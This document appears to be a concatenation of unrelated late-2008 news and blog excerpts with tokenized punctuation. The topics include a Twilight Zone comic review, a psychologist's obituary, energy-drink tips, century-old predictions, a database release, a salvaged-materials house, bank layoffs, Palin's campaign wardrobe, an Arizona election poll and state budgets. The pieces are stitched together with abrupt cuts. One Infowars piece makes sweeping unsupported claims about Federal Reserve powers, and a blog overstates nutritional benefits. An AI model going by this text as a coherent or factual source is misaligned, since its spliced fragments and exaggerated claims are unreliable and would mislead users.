However , becoming happy does not help migrate a person from the network fringe to the center .
Happiness spreads through the network without altering its structure .
The study was supported by the National Institutes of Health and the Robert Wood Johnson Foundation .
The authors report no financial disclosures .

Abstract
When I was a kid , I can remember looking through a friend 's stack of comic books and stumbling across a book of Twilight Zone stories .
I recall thinking , " How cool is this ?
The same show that I love to stay up and watch is here in my hands just waiting to be read and – unlike the show – the comic is in color ! "
So , I was excited to see that the Savannah College of Art and Design have teamed up with book publisher , Walker & Co. to revisit the Twilight Zone and plan to publish eight graphic novels based on early episodes .
I had a chance to read Walking Distance , a story from Season One of The Twilight Zone .
( You can watch Walking Distance and other early episodes here . )
The Walking Distance episode is one of the most personal that Rod Serling ever wrote and an early favorite among many fans and viewers .
It tells the story of a man named Martin Sloan who , trying to escape the stresses of his life , finds himself traveling back in time to his childhood town and enjoying the simplicity of life as a kid before a series of events make him realize that you can never really go back home again .
The new graphic novels are being targeted at younger readers , though adults may find interest in them too .
The artwork is good , although minimalist at times and the story has been adapted well from the episode .
At the end of the book is a page listing the full credits from the television episode , including production notes .
Plus , there 's a message from Mark Kneece , who adapted this book and founded SCAD 's sequential art program , about the challenges and responsibilities of taking on such an influential series as The Twilight Zone .
Overall , the book was pretty good and suited well for young readers who have n't seen the old Twilight Zone episodes .
But , for me , I could n't help feeling it lacked something .
Maybe it was because the suspense that Serling masterfully built on film does n't translate to paper very well .
Perhaps it was because the off - angle framing and unusual point - of - view shots – that were everywhere in the TV episodes – were missing in the graphic novel .
Or maybe the episodes were just memories in my head that no book could never live up to .
I guess that , like Martin Sloan , I learned you can never truly go home again .
Robert B. Zajonc , a distinguished psychologist who illuminated the mental processes that underpin social behavior and in so doing helped create the modern field of social psychology , died on Wednesday at his home in Stanford , Calif .
He was 85 .
The cause was complications of pancreatic cancer , his son Michael said .
At his death , Professor Zajonc ( pronounced ZYE- unts ) was emeritus professor of psychology at Stanford University , where he had taught since 1994 .
He previously had a long association with the University of Michigan .
Until the mid-20th century , social scientists seeking the impetus for human behavior tended to look reflexively to people ’s environments .
That , in an era when behavioral psychology reigned supreme , was precisely what they had been trained to do .
Professor Zajonc , by contrast , also looked to the mind .
Published widely in professional journals and cited often in the news media , Professor Zajonc ’s work ranged across the mental and social landscape .
Among the subjects he investigated over five decades were the effect of birth order on intellectual performance ; whether the mere presence of spectators can influence a performer for good or ill ; and whether smiling can be a cause , as well as a consequence , of a good mood .
Alternative energy is a hot topic these days .
As I was reading about new technologies in renewable energy , it struck me that most discussions surrounding alternative energy concerned energy consumed outside of ourselves .
New and renewable energy sources for cars and factories and cities are explored in great detail , but ultimately , our personal energy level is what gets things accomplished .
Our kids seem to have energy to spare , but we as parents need to be one step ahead of them , making sure meals are made , bills are paid , clothes are clean , and car - pools to soccer and gymnastics are on time .
So I find myself wondering …
Bio -diesel and hydrogen fuel cells can power our machinery , but what ’s powering us ?
Our fuel is the food that we eat .
Optimally , we are all eating a balanced diet containing all of the nutrients and minerals and antioxidants that we need in order to keep up with our busy lives and our extremely active children .
Does n’t always happen .
I find myself grabbing snack foods for lunch , or substituting dessert for dinner , simply because “ I do n’t have the time to eat better . ”
Frankly , that ’s more of a justification to myself for eating junk than a valid reason for not eating healthier …
I love coffee .
I find it too easy to just get another Americano when I ’m feeling sluggish .
( By the way , I ’m lobbying to change the name to a “ derekano ” at my local coffee shop , but it has n’t taken off yet … )
Too much caffeine and sugar can really throw our bodies out of balance .
Our adrenal glands , liver and kidneys take on extra work every time we toss back a cup of caffeinated beverage or highly sweetened soda .
While I can’t personal advocate for giving up coffee , there are alternatives that we can choose when feeling low - energy .
Natural energy boosters are beneficial to us , pumping up our immune system and providing essential nutrients to help our body help itself .
Here ’s my list :
Alternative Energy Drinks :
Water –
Most of us do n’t drink enough water anyway , so focusing on better hydration before you get tired can help your energy levels .
Drinking lots of water before lunch can help you to eat less and still feel full , missing the drowsy feeling of eating a big meal .

Lemon juice in water – Keep a lemon with you and squeeze half of it into a glass of water when you need a lift .
In winter , hot lemon tea hits the spot .
Lemons are a good source of vitamin C , phytonutrients and antioxidants .

Emergen - C – My favorite for cold and flu season as well , Emergen - C is a convenient way to get your electrolytes , vitamin C , and B6 and B12 as well .
Plus , it ’s fizzy and comes in many flavors .
I like the tangerine flavor .

Fresh fruit smoothie – Make a smoothie in the morning and give yourself a healthy boost of fruit sugar instead of caffeine .

Yerba Maté – Maté has caffeine , but is generally less “ speedy ” than coffee and does n’t give you the caffeine hangover effect when you come down .
Along with phytonutrients , yerba maté contains practically all vitamins necessary to sustain life , and 15 amino acids and significant quantities of magnesium , calcium , iron , sodium , potassium , manganese , and chlorophyll .
I make mine with licorice root for sweetness , and peppermint for minty - ness .

Young Coconut Juice – Best consumed fresh from a young coconut , but still great in a can , coconut water or juice is a powerful electrolyte drink and energy booster .
Also called Thai coconuts , young coconuts generally have part of the husk still attached and look white , not brown .
I like the Amy and Brian brand coconut juice in a can when I ’m feeling burned out .

Green Tea –
With only a third of the caffeine as coffee , and a potent source of polyphenols , green tea is a good choice for the afternoon blues .
I like bancha and genmaicha ( green tea with brown rice ) .

Maca –
A root sometimes referred to as “ Peruvian ginseng ” because of its similar effectiveness in increasing energy and stamina , and in enhancing fertility and sex drive .
Add maca to smoothies or drink in your herb tea .
Ask for maca at your local health food store or herbalist .
By replacing one coffee a day with one of these alternative energy drinks , I know my body ( and family ) will appreciate the extra vitality that I have ( and I wo n’t miss that feeling of hitting the wall ) .

In the December 1900 issue of Ladies Home Journal , John Elfreth Watkins put together a collection of predictions for the future of the United States and the world by the end of the 20th century .
In “ What May Happen in the Next Hundred Years ” , Watkins surveyed a group of “ the wisest and most careful men in our greatest institutions of science and learning ” about “ will have been wrought in his own field of investigation before the dawn of 2001 .
Some of the predictions are uncannily accurate , yet others are more than a little wide of the mark .
We ’ve cherry - picked 14 enviro - related predictions and coupled them with a brief analysis of what actually happened .
Enjoy .
Prediction : “ Automobiles will be cheaper than horses are today .
Farmers will own automobile hay - wagons , automobile truck - wagons , plows , harrows and hay - rakes .
A one - pound motor in one of these vehicles will do the work of a pair of
horses or more .
Children will ride in automobile sleighs in winter .
Automobiles will have been substituted for every horse vehicle now known .
There will be , as already exist today , automobile hearses , automobile police patrols , automobile ambulances , automobile street sweepers .
The horse in harness will be as scarce , if , indeed , not even scarcer , then as the yoked ox is today . ”
What happened : Partially true .
Generally speaking , horses cost less than new cars , excepting show and race horses .
However , the gist of the prediction rings true .
Cars , trucks , and buses have all - but replaced the horse in American society as a means of transportation and performing work .
2. Prediction : “ There Will Be No Street Cars in Our Large Cities .
All hurry traffic will be below or high above ground when brought within city limits .
In most cities it will be confined to broad subways or tunnels , well lighted and well ventilated , or to high trestles with “ moving - sidewalk ” stairways leading to the top .
These underground or overhead streets will teem with capacious automobile passenger coaches and freight with cushioned wheels .
Subways or trestles will be reserved for express trains .
Cities , therefore , will be free from all noises . ”
What happened : Most cities in the U.S. dismantled their street car networks or converted the tracks to light rail in the middle of the 20th century .
New Orleans and Toronto still run their streetcars networks along essentially the same principle and layout as they did 100 years ago , while cities like Boston , San Francisco , Philadelphia and Pittsburgh have rebuilt their streetcars into light rail networks .
3. Prediction : “ Trains will run two miles a minute , normally ; express trains one hundred and fifty miles an hour .
To go from New York to San Francisco will take a day and a night by fast express .
There will be cigar - shaped electric locomotives hauling long trains of cars .
Cars will , like houses , be artificially cooled .
Along the railroads there will be no smoke , no cinders , because coal will neither be carried nor burned .
There will be no stops for water .
Passengers will travel through hot or dusty country regions with windows down . ”
What happened :
The top operating speed on France ’s renowned high - speed TGV is 186 miles per hour .
Which is actually closer to three miles a minute .
Under special test conditions a TGV trainset has reached 320 mph .
High - speed rail systems have proliferated in Europe and parts of Asia , but the U.S. has lagged .
The only high speed train in the U.S. , The Acela Express , which runs from Boston to Washington D.C. and points between runs at speeds up to 150 mph .
Unfortunately , there is no “ fast express ” from New York To San francisco .
In stead of taking “ a day and a night ” as suggested by Watkins , the trip would take you somewhere between 70 and 80 hours .
Assuming a likely layover in D.C. or Chicago , we ’re talking closer to three and half days .
But they are cooled and they do n’t run on coal .
The trains do not need to stop for water , but they will often need to stop and give priority to a passing freight train one of the big four railroads who still own the vast majority of the tracks in the U.S .
4. Prediction : “ There will be air - ships , but they will not successfully compete with surface cars and water vessels for passenger or freight traffic .
They will be maintained as deadly war - vessels by all military nations .
Some will transport men and goods .
Others will be used by scientists making observations at great heights above the earth . ”
What happened : Actually , “ Air - ships ” compete quite well with surface cars and water vessels for passenger and freight traffic .
High - volume passenger air travel is often only competitive because of generous government subsidies , as airlines in the U.S. and elsewhere are well - known for going bankrupt because of the tenuousness of the industry .
Air travel has still made very little mark on the short and medium length trips that automobiles and rail have dominated in .
Air - ships , however , are indeed maintained as deadly war - vessels by all military nations .
And as the events of September 11 , 2001 indicate , air - ships are also used as deadly war - vessels by non-military actors , too .
5. Prediction : “ No Mosquitoes nor Flies .
Insect screens will be unnecessary .
Mosquitoes , house - flies and roaches will have been practically exterminated .
Boards of health will have destroyed all mosquito haunts and breeding - grounds , drained all stagnant pools , filled in all swamp - lands , and chemically treated all still - water streams .
The extermination of the horse and its stable will reduce the house - fly . ”
What happened : Umm , no .
An estimated 1.5 million people die every year from Malaria , a disease transmitted to humans exclusively by mosquitoes .
6. Prediction : “ Black , Blue and Green Roses .
Roses will be as large as cabbage heads .
Violets will grow to the size of orchids .
A pansy will be as large in diameter as a sunflower .
A century ago the pansy measured but half an inch across its face .
There will be black , blue and green roses .
It will be possible to grow any flower in any color and to transfer the perfume of a scented flower to another which is odorless .
Then may the pansy be given the perfume of the violet . ”
What happened :
The hybridization of flowers can produce virtually any flower in any color .
As Michael Pollan so eloquently wrote in Second Nature , “ Not that the modern rose lacks for novelty — indeed , novelty is a big part of their problem .
Twentieth - century capitalism discovered the rose and decided what it needed after several millennia of successful cultivation was a full - tilt program of R&D , innovation , market research , positioning , and advertising .
As gardeners are fond of pointing out , the modern rose industry appears to have modeled itself after Detroit .
Each year it introduces a handful of ‘ exciting ’ new models , many of them in improbable neon and metallic shades better suited to a four - door than a flower … ” Continued …
Today we officially announce our new storage engine , “ Percona XtraDB “ , which is based on the InnoDB storage engine .
It ’s 100 % backwards - compatible with standard InnoDB , so you can use it as a drop - in replacement in your current environment .
It is designed to scale better on modern hardware , and includes a variety of other features useful in high performance environments .
Percona XtraDB includes all of InnoDB ’s ACID - compliant design and advanced MVCC architecture , and adds features , more tunability , more metrics , more scalability on many cores , and better memory usage .
We choose features and fixes based on customer requests and on our best judgment of real - world needs .
We have not included all the InnoDB patches available .
For example Google ’s well - known InnoDB patch set is omitted ( at least for now ) .
The first version of our new storage engine is 1.0.2 - 1 , which is forked from InnoDB- plugin - 1.0.2 .
Percona XtraDB is released under GPL v2 , as is InnoDB - plugin base source code .

Jim Juczak hates mortgages .
When he started building his home in rural Jefferson County , he resolved to stay out of debt .
The house he finished five years later is an 18 - sided structure with 3,000 square feet of space .
It is mortgage - free .
And much of it is made from junk .
The support beams are salvaged from a bowling alley that was being demolished .
A two - story concrete column that supports the center of the house is made from scrapped manholes .
Windows , interior doors , sinks , tubs and other materials were bought cheap or salvaged for free after being removed from renovated buildings .
And the mortar for the outer wall was made from paper sludge , a waste material from a nearby mill .
Juczak had to get a special permit from the state Department of Environmental Conservation to divert the sludge from a landfill .
" Everyone gave it ( the permit ) with much humor , because this is basically garbage , " Juczak said .
" You know -- ' Oh , my gosh !
He 's living in a house made of trash ! '" Among homesteading enthusiasts in the North Country , Juczak , 50 , has a reputation as the sultan of scrounge .
His 50 - acre property even contains a submarine - like guest house made from an old 10,000 - gallon fuel tank buried into a hillside .
( The windowless bedroom is , as the Realtors say , cozy . )
" He 's the king of scrounging everything , " said Patricia Greene , of Canton , a member of the Ark Community , a group that shares information about sustainable living .
Now Juczak is reaching out to a wider audience .
He has taken a year - long leave from his job as a middle - school shop teacher to spend more time spreading a message of simple living and self - reliance .
Among the first items on his agenda is to finish the book he 's writing , " The High Art and Subtle Science of Scrounging . "
He 's also taking on speaking engagements at energy fairs and conferences around the country .
And he 's planning to expand the number of workshops he hosts at his property in Adams to a dozen a year .
Topics include how to make a wind turbine , how to grow and preserve your own food , and how to build a home for $ 20,000 or less , among others .
Juczak typically charges $ 100 a day for his workshops , which can run one to four days .
At the end of the year , Juczak will decide whether to return to school teaching or to pursue his new calling full - time .
" I like to do stuff like this , " Juczak said .
" I like to pass on the message that you can live a bit simpler . "
It 's a message people need to hear , Greene said .
The debt - driven , energy - intensive American lifestyle is not only harmful to the environment ; it 's also getting more difficult to achieve as oil and other fossil fuels become more expensive , she said .
A more self - sufficient and less acquisitive lifestyle can be a rewarding alternative .
" It requires a kind of mentality that looks at being poor as being rich , " Greene said .
Richard Freudenberger , the publisher of North Carolina - based BackHome magazine , has advised Juczak on sections of his book .
The worse the economy gets , the more books like that attract interest , he said .
" When things get tough , you would be amazed at how people shift their thinking , " Freudenberger said .
' Less is more '
On a recent morning , Juczak ( pronounced JU - zack ) chatted about home - building while cutting up apples and tossing them into a big pot on the stove to make applesauce .
( It 's a commercial - sized cast iron stove he picked up for $ 300 when the restaurant upgraded to stainless steel . )
The apples -- 12 buckets and pails worth -- were free , picked from the tree of a neighbor who prefers store - bought apples .
" She 's very happy not to have to rake rotten apples off her lawn , " Juczak said .
In 1996 , Juczak and his wife , Krista , bought 50 acres outside of Adams Center .
The Juczaks grow about 40 percent of their own food .
Canning jars full of applesauce , string beans , jam , sauerkraut and other foods line the walls .
The Juczaks have opened their property to other residents who want to adopt the self - reliant lifestyle .
Five new households , including a family of four , are planning or building homes there .
The Juczaks call their place Woodhenge , " a sustainable community and self - reliance educational center . "
Among the soon - to - be residents is Elizabeth " Lee " Brown , an Oswego County native .
She , her husband and two children fled their fast - paced urban life in Virginia , where she had a high - paying job with a military contractor .
They plan to build a house constructed of straw bales at Woodhenge .
" Less is more , " Brown said of their decision .
" Less is peaceful .
Less gives you space in your head to figure out what you want to do . "
Like the Juczak 's home , two guest houses at Woodhenge represent outsized feats of recycling .
One of them is made from a 10,000 - gallon kerosene tank recovered from a factory that closed .
After the tank was steam - cleaned , Juczak and friends cut entry holes on either side of the 10 - foot by 27 - foot tank .
Then they buried it on one side with an earthen berm .
The second is a recycled motel .
When a bank in Adams planned to raze a motel and build a branch , Juczak scrambled to buy the motel for $ 2,500 .
He spent another $ 2,500 moving it .
Following an interior renovation and the addition of a new roof and porch , the former motel is a guest cottage with two bedrooms , a large community room and a kitchen .
Together on the Ark
Rich Douglass , a carpenter from St. Lawrence County who helped work on Juczak 's house , said finding used materials is critical for self - reliant homesteads .
Douglass , his wife and three young children live with no electricity , no car and no running water on a 160 - acre farm in Hermon .
They can get by on $ 6,000 a year , he said .
" Most of our stuff is used , " Douglass said .
" I 've never bought any furniture .
The only things we 've ever bought for our children are socks and underwear -- everything else we 've gotten used . "
Two years ago , Douglass started the Ark Community .
The group , which includes Juczak , typically attracts about 40 people to its monthly pot-luck dinners , mostly from the Potsdam area .
Members demonstrate homesteading skills or share work such as barn - raising .
In rural Northern New York , Juczak is a long way from his roots .
He was born in Brooklyn and raised on Long Island .
But Juczak said he always found city life too busy and wasteful .
He leans toward Spartan living .
During graduate school , he lived in a converted school bus .
If he did n't have family , he said , he would have built himself a tiny house .
" I would have put up a cave , " he said , " One window , and bury the thing .
Six - foot six - inch ceilings . "
Juczak said his first inclination , after building the house at Woodhenge , was to ring the property with barbed wire and get a pack of Rottweilers " to protect myself . "
In his more paranoid moments , he fears there could be a breakdown in society as energy grows ever more expensive , leave many people unprepared and panicked .
A political libertarian , Juczak has little faith in government to address such a crisis .
But the more he thought about it , he does have faith in community .
Far from putting up a fence , Juczak makes every effort to be neighborly .
" Independence is good , but nobody can be completely independent , " he said .
" The best way for me to look out for myself is to make sure others are looking out for me because they know I 'll help them out .
... I 'd rather depend upon a neighbor than a municipality or a government . "
Building with sludge
Juczak started building his house in 1997 in his spare time , with help from friends , relatives and hired teen - aged students from his shop classes .
It took five years to finish , during which he trolled the county for materials .
At a local concrete company , he found the discarded manholes that would make the central " tower " of his house -- a massive cylindrical column made of steel - reinforced concrete .
Seven feet wide and 23 feet tall , the tower rises through the center of the house , supporting the roof rafters and second - story floor joists .
It 's made from sections of manholes that were rejected for minor imperfections .
Juczak 's cost to buy and stack the manholes : $ 550 .
The tower also provides central heating .
Juczak worked with a friend to make a two - ton , wood - burning stove in the tower 's hollow interior .
He then filled the column 's interior 16 feet high with sand , creating a 35 - ton radiator that provides steady heat throughout the house .
The huge roof rafters and perimeter support posts for his house were salvaged , along with other lumber , from a Watertown bowling alley as it was being demolished .
Juczak and a part - time crew of high school kids spent the better part of a summer disassembling the bowling alley 's 100 - foot - long trusses and taking nails out of the recycled framing lumber .
He paid $ 10,000 for the materials , but figures they were worth five times that .
The 16 - inch log ends used in the cordwood masonry walls were cut from a forest of red pine decimated by North Country ice storms .
Since the dead trees were too small for lumber , they were his for the taking .
So was the mortar for the masonry outer wall .
It was made from paper sludge , the waste material that did n't make it through the filter screens at a nearby paper mill .
The mortar was 80 percent sludge , 20 percent masonry cement .
To get electricity from National Grid , Juczak would have had to pay $ 6,800 for the utility company to bring in an electric line , pole and transformer to serve them , Juczak said .
Instead , he built a household electric system that runs on 1 - kilowatt worth of solar panels and a 1 - kilowatt wind turbine , with an occasional boost from a gas - powered generator .
And the family learned to conserve .
The Juczaks and their 11 - year - old daughter use just 120 kilowatt - hours a month , about one - sixth what a typical household uses .
" You can view me as a tree hugger or as a cheapskate , " Juczak said .
" The end result is the same . "
And which is he , at heart ?
" A cheapskate . "

Bank of America says the cuts will be across both businesses Bank of America has said it plans to cut between 30,000 and 35,000 jobs over three years following the completion of its takeover of Merrill Lynch .
The reduction could affect about 11 % of the combined firms ' 308,000 workforce .
Bank of America said the move would reflect both post - merger efficiency savings , and " the weak economic environment " which had hit business .
The $ 50bn ( £ 33 bn ) takeover of Merrill was announced in September .
It came after Merrill had seen $ 40 bn losses .
Bank of America said the job cuts would come across both businesses , although it said it could not give exact numbers until early 2009 .
Industry - wide cuts
The takeover has already gained shareholder approval and is due to be completed in the New Year .
In this day and age , it does n't look as draconian , especially compared with what Citigroup did
Analyst Howard Diamond
The combined company will be America 's largest bank by assets .
Merrill 's loses were caused by bad debt connected to the downturn in the US housing market .
The September announcement of its takeover by Bank of America came on the same weekend that rival investment bank Lehman Brothers said it was going into bankruptcy protection .
Thursday 's job loss announcement comes three weeks after fellow American bank Citigroup said its job cuts would now total 75,000 .
" If you asked me six months ago I would be surprised , but in this day and age , it does n't look as draconian , especially compared with what Citigroup did , " said analyst Howard Diamond , chief executive of Diamond Consultants .

Dump the Dogs .
This must be one of those “ never go wrong by saying this ” advice because is n’t it true that we should always dump the dogs ?
The author points out that in this bear market , get out of industries that are depend on the weakening consumer to reap the tax loss for the year .
Be Price Conscious .
Stop paying more than 1 % expense ratio on your mutual funds .
This especially sucks in a bear market because you have to pay this even though the fund lost you money !
You can always get a very similar ETF or mutual fund at 0.70 % or even less .
Be Wary of Technology – Even tech is n’t safe because everyone is expecting company spending to drop in the next 12 months .
Consider “ Sticky ” Firms .
Look for industries that have “ sticky ” customers and still have the ability to maintain their price .
Managed - care and property - and - casualty insurers could be worth looking at again .
Look for Attractive Bonds .
Fear is on everybody ’s mind right now and people are dumping bonds as they are afraid that companies will not be able to pay .
He cautions to only look for bonds from companies of high quality though – businesses that are n’t tied to consumer spending .
Do n’t Jump in Feet First .
The recession could drag on for an extended period .
Do n’t jump in and start buying with all your cash even though stock values seem depressed .
Tiptoe In .
If the economy stays sluggish , dollar cost averaging now seems like a great bet .
Over the long haul , stock market performances will work in your favor .
Within the article , there were a few recommendations :
Coca - Cola ( KO )
Teva Pharmaceutical Industries ( TEVA ) – a play betting that Obama will curb drug costs
Long - term debt of Verizon
i Shares MSCI Emerging Markets Index Fund ( EEM ) for those with long term perspective

More Dirt on Sarah Palin's Fancy Duds
Sarah and Todd Palin ( David McNew / Getty Images )
The McCain - Palin campaign is over , but Wardrobe - gate lives on .
More embarrassing details have emerged about Sarah Palin 's infamous shopping sprees -- including even more designer duds , plus sprayed - on tans and fancy underwear .
On top of the $ 150,000 first outlined in Federal Election Commission filings , Palin spent " tens of thousands of dollars " on additional clothing , makeup and jewelry for herself and her family , including $ 40,000 in luxury goods for her husband , Todd , our colleague Michael Shear reports .
The campaign was charged for silk boxer shorts , spray tanners and 13 suitcases to carry all the designer clothes , according to two GOP insiders .
" The shopping continued after the convention in Minneapolis , it continued all around the country , " one source said .
" She was still receiving shipments of custom - designed underpinnings up to her ' Saturday Night Live ' performance " in October .
Sources said expenses were put on the personal credit cards of low - level Palin staffers and discovered when they asked party officials for reimbursement .
Newsweek reports that top McCain aides were stunned by the huge tab , especially after adviser Nicolle Wallace had told Palin to buy three outfits for the convention and three for the campaign trail , with a budget of $ 25,000 ; instead , the nominee racked up six - figure bills at high - end department stores .
" Wasilla hillbillies looting Neiman Marcus from coast to coast , " a McCain aide sniffed to the magazine .
Palin has always contended that she did n't ask for the extravagant makeover .
The campaign previously said the used clothing would be auctioned off for charity ; the L.A. Times reports that a Republican National Committee lawyer is headed to Alaska to inventory and retrieve the items still in her possession .
Palin even raised eyebrows for what she did n't wear : In St. Paul during the convention , McCain senior staffers Steve Schmidt and Mark Salter arrived at her hotel room for a briefing and found her wearing nothing but a towel , with a second one wrapped around her wet hair , Newsweek reports .
" I 'll be just a minute , " she said , ordering them to chat with the First Dude while they waited .

How could the Lincoln Memorial 
“ With malice toward none ; with charity for all ”  be as moving if the black neighborhoods of a charming American city were left to drown while the president mountain - biked ?

How can the black marble V of the Vietnam Memorial have power when those in power repeat the mistake of Vietnam ?
How can the Capitol , where my dad proudly worked for so many years , hold its allure when the occupants have spent their days  and years  bickering and scoring petty political points instead of stopping White House chicanery and taking on risky big issues ?
How can the F.D.R. Memorial along the Tidal Basin be an uplifting trip to the past when the bronze statue of five stooped men in a bread line and the words of F.D.R. ’s second inaugural 
“ I see one - third of a nation ill - housed , ill - clad and ill - nourished ”  evokes the depressing present ?
Obama may be in over his head .
Or he may be heading for his own monument one day .
His somber speech in the dark Chicago night was stark and simple and showed that he sees what he ’s up against .
There was a heaviness in his demeanor , as if he already had taken on the isolation and “ splendid misery , ” as Jefferson called it , of the office he ’d won only moments before .
Americans all over the place were jumping for joy , including the block I had been on in front of the White House , where they were singing : “ Na , na , na , na .
Hey , hey , hey .
Goodbye . ”
Federal Reserve regional bank presidents describe invocation of ‘ war powers ’ by Board of Governors in Washington
Steve Watson
Infowars.net
Tuesday , Dec 9 , 2008
Regional bank presidents of the Federal Reserve have described the ongoing financial policy making of Washington officials as a complete usurpation of authority and an invocation of emergency powers .
The district chiefs ’ authority over borrowing costs has been marginalized in the past two months as Chairman Ben S. Bernanke and the Fed Board of Governors in Washington made their own decisions on emergency measures to flood the economy with cash , reports Bloomberg News .
Several former and current regional bank presidents have intimated that they now have little to no influence over the Federal Reserve ’s actions and that the central bank has effectively been completely hijacked by high ranking insiders .
“ The Board has usurped authority , ” said William Poole , former president of the St. Louis Fed and now a senior fellow at the Cato Institute in Washington .
“ This dramatic change in policy direction has not been announced or even acknowledged . ”
James Bullard , Poole ’s successor at the St. Louis Fed , has described the shift as a move toward a “ new world ” and clearly holds out little hope that the situation will improve .
“ Whatever our communications problems are now , they are going to be magnified in this new world we are going to be in , ” Bullard has said .
“ If I am a regional Fed bank president , I have had my power diminished a lot , ” said Ethan Harris , co-head of U.S. economic research at Barclays Capital Inc. in New York , who used to work at the New York Fed .
“ I think of it as war powers for the Board of Governors . ”
A d v e r t i s e m e n t
( ARTICLE CONTINUES BELOW )
The Fed has twelve regional presidents that are supposed to offer a counterbalance to the central board of governors , however , the regional presidents have recently not even been offered the opportunity to vote on initiatives such as a new $ 600 billion program to buy mortgage - related debt and securities and a $ 200 billion facility to support consumer debt securities .
This trend is likely to continue at a meeting next week when regional presidents could be told to just go along with a Fed announcement that it is set to lower interest rates again in order to allow increased borrowing at a cheaper rate .
Fed chairman Ben Bernanke hinted last week that the Fed will likely also purchase Treasury or agency securities in “ substantial quantities . ”
Since the Original bailout bill was passed in early October , the Fed has swallowed up all manner of new regulation powers .
As we reported in our September 25th article , the bill set a precedent to allow the government and the Fed carte blanche to do whatever they want to long as it is done in the name of stabilizing financial markets .
The Fed can nationalize any company or industry and use taxpayer money for whatever purpose is deemed necessary , without any oversight .
The policy is also unreviewable by any court , it will remain in perpetuity .
This is not just about continued seizure of taxpayers ’ money and the continued sacking of the dollar , it ’s about the imposition of a giant new infrastructure of control and regulation on behalf of the private , run for profit , Federal Reserve .

So , farewell Dubya , an " all our Christmases come at once " gift to the cartoonist .
Whether it was as Dumbo , the little Republican elephant crapping on the world from a great height , or as a bow - legged , knuckle - dragging ape , you were a joy to draw .
Will I miss you …?
Nah !
Not a bit , I 've drawn you to death and there are new fish to fry .
So much of cartooning comes down to zoomorphism .
A reader of this paper once told me how much she enjoyed my cartoons , before dismissing a vast percentage of my oeuvre by adding , " apart from when you draw politicians as animals " .
She never elaborated , but I suspect she considered my images of poodles , monkeys , dodos and lame ducks to be offensive … not to our political masters , but to our furred and feathered friends .
It was the 19th - century cartoonist Thomas Nast who popularised the elephant and the donkey as symbols for the Republicans and Democrats ( long before the parties themselves adopted them ) , and this presidential campaign has also provided a fabulous menagerie of beasts .
Download the new Independent Premium app Sharing the full story , not just the headlines
My first thoughts were to portray the interminable Democratic primaries as a donkey derby .
However unlike the lugubrious , long - faced Kerry in 2004 , surprisingly neither Hillary nor Barack made a convincing ass .
It was only when I had the revelation that they were in fact the two mismatched ends of a pantomime donkey , pulling against each other , that the gag worked .
McCain 's campaign struggled to drag itself out of the primordial swamp until he chose his running - mate .
Sarah Palin entered the picture a fully formed caricature .
Once you had got the beehive , the glasses and the lipstick you could draw her as anything - and I did .
A pitbull , a pig , a moose ; it was actually some time before I drew her as anything other than an animal , and when I realised that making her look human was the really hard thing .
By the time you read this we should know who I 'll be drawing for the next four years , if not yet as what .
Time to drag the well - thumbed Atlas of World Wildlife off the shelf .

Sen .
John McCain 's once - comfortable lead in Arizona has all but evaporated , according to a new poll that has the underdog Republican presidential candidate struggling in his own backyard .
With less than a week until Election Day , McCain is leading his Democratic rival , Illinois Sen.
Barack Obama , by 2 points , 46 to 44 , down from a 7 - point lead a month ago and a double - digit lead this summer , according to a poll from Arizona State University .
Factor in the 3 - percentage point margin of error , and a race that was once a nearly sure thing for McCain is now a toss - up , pollsters say .
" One would think McCain would still carry Arizona , but anybody who says they can predict the state this time , they can't .
It 's going to depend on who goes to the polls , " said Tara Blanc , associate director of the poll , which was done by ASU 's Walter Cronkite School of Journalism and Mass Communication and local PBS affiliate Channel 8 ( KAET ) .
The poll of about 1,000 registered voters indicated about 9 percent are undecided , giving campaigns few people to convince in the next six days .
Working in McCain 's favor , the state has 1.1 million registered Republicans , about 96,000 more than Democrats .
In Obama 's favor , the state has about 824,000 independent voters who support Obama over McCain 60 percent to 40 percent , according to the poll .
Polls tightening
Into early fall , political experts put Arizona solidly in the GOP column .
But the state 's polls began to tighten in late September , shortly after the Wall Street crisis and as McCain started to stumble in other states .
Both campaigns operate offices in Arizona , but their focus has been split between Arizona and the crucial neighboring swing state of New Mexico .
Neither candidate has done much personal campaigning in Arizona , instead focusing on swing states .
The ASU poll is one of at least four within the past week that indicate the race here is tightening further .
The national Rasmussen Reports has McCain with 51 percent to Obama 's 46 .
Northern Arizona University has McCain up 49 to 41 .
The Project New West poll has McCain leading by 4 points , 48 to 44 percent .
RealClearPolitics.com , which tracks the last three polling averages and excludes partisan polls , gives McCain an average 6 - point lead over Obama in Arizona .
The results do n't include the latest ASU poll .
By contrast , Obama has an average 23 - point advantage in his home state of Illinois .
Presidential candidates usually win their home states , although Democratic candidate Al Gore lost Tennessee in 2000 .
In 2004 , Sen . John Edwards , the vice - presidential nominee , failed to secure his home state of North Carolina for the Democratic ticket .
In 1964 , Barry Goldwater , McCain 's predecessor in the Senate , won Arizona - but just barely .
He beat Lyndon Johnson in the state by a single percentage point .
McCain confident
McCain 's campaign expressed confidence in victory and suggested that Obama 's unprecedented private fundraising , which includes money from donors now under scrutiny , has let him become competitive even in Arizona .
" John McCain has never lost an election in Arizona , and this one will be no different , regardless of Obama 's attempt to buy the election with millions of dollars in advertising , " spokesman Jeff Sadosky said in an e-mailed statement .
ASU pollsters say McCain is doing well among the state 's conservative Democrats , which could give him an edge .
In 16 other states long considered more competitive , Obama has a decided polling advantage in at least eight of them .
Obama has comfortable leads in Colorado , Iowa , Michigan , Minnesota , New Hampshire , New Mexico , Pennsylvania and Wisconsin .
He also narrowly but consistently leads in Florida , Nevada , Ohio and Virginia .
McCain is ahead in West Virginia .
In recent polls , both candidates have had slim leads in Indiana , Missouri and North Carolina .
Overall , McCain appears to lead in 21 states , including Arizona .
Obama appears to lead in 26 states and Washington , D.C .
Three states - North Carolina , Missouri and Indiana - seem too close to call .
If the election results match those polls , Obama will have at least 338 electoral votes to McCain 's 163 , with 37 unclear .
It takes 270 electoral votes to win .
Obama campaign officials say they are thrilled with the Arizona trend .
" Our plan remains to work as hard as we possibly can and keep the direction headed as positively as it has been , " said Kelly Paisley , Obama 's Arizona director .
Reporters Ronald J. Hansen , Dan Nowicki and Mary Jo Pitzl contributed to this article .

A Strain on State Budgets
At least 37 states and the District of Columbia have faced or are facing budget gaps totaling $ 66 billion in the 2009 fiscal year .
Most states , which rely on sales , income and property taxes , are seeing a significant drop in such revenues or increases that are below the inflation rate , compared to the same period last year .
Unlike the federal government , states are generally required to balance their budgets each year .

Top US Spy Boss : Investigation Underway into ABC News Report Allegations include US eavesdropping on " phone sex " between Americans .
October 20 , 2008  --
